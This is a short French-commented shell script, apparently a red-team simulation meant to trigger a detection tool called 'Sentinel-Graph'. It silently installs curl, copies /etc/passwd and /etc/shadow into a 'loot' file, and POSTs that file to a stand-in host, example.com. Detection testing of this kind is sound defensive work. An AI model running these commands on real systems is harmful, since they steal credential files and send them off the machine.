#!/bin/sh
# Simulation d'une exfiltration de données sensibles (UNEXPECTED_READ + UNEXPECTED_CONNECTION)
echo "🚨 [RED TEAM] Exécution de la charge utile : Data Exfiltration"

# 0. Préparation de l'outil d'exfiltration
echo "   [+] Installation silencieuse d'un utilitaire de transfert externe..."
apk add --no-cache curl > /dev/null 2>&1

# 1. Accès à des fichiers non documentés dans la baseline (openat suspect)
echo "   [+] Vol des fichiers de configuration système..."
cat /etc/passwd > /tmp/loot_secrets.txt
cat /etc/shadow >> /tmp/loot_secrets.txt 2>/dev/null || echo "   [-] Permissions insuffisantes pour shadow, mais la tentative est loggée !"

# 2. Exfiltration silencieuse (tcp_connect suspect + tool inédit)
echo "   [+] Exfiltration vers le serveur distant..."
curl -s -X POST -d @/tmp/loot_secrets.txt http://example.com/upload > /dev/null

echo "✅ Données exfiltrées. Regardez les alertes Sentinel-Graph !"
